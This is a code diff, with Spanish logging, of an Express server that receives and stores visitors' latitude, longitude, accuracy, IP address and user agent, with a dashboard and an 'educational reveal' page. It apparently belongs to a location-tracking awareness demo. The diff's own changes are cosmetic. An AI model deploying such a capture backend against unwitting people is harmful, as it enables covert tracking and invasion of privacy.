@@ -5,7 +5,7 @@ const app = express();
 const PORT = 3000;
 
 app.use(express.json());
-app.use(express.static(path.join(__dirname, 'public')));
+app.use(express.static('public'));
 
 // In-memory storage for captured locations
 const capturedLocations = [];
@@ -22,7 +22,7 @@ app.get('/dashboard', (req, res) => {
 
 // Serve the educational reveal page
 app.get('/educativo', (req, res) => {
-  res.sendFile(path.join(__dirname, 'public', 'educativo.html'));
+  res.sendFile(__dirname + '/public/educativo.html');
 });
 
 // API: Receive captured location
@@ -30,7 +30,7 @@ app.post('/api/location', (req, res) => {
   const { latitude, longitude, accuracy, timestamp } = req.body;
   const userAgent = req.headers['user-agent'] || 'Desconocido';
   const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress || 'Desconocido';
-  
+
   const entry = {
     id: capturedLocations.length + 1,
     latitude,
@@ -40,14 +40,14 @@ app.post('/api/location', (req, res) => {
     ip,
     capturedAt: new Date().toISOString()
   };
-  
+
   capturedLocations.push(entry);
   console.log(`\n🎯 [UBICACIÓN CAPTURADA] #${entry.id}`);
   console.log(`   Lat: ${latitude}, Lng: ${longitude}`);
   console.log(`   Precisión: ${accuracy}m`);
   console.log(`   IP: ${ip}`);
   console.log(`   User-Agent: ${userAgent.substring(0, 60)}...`);
-  
+
   res.json({ success: true });
 });
 
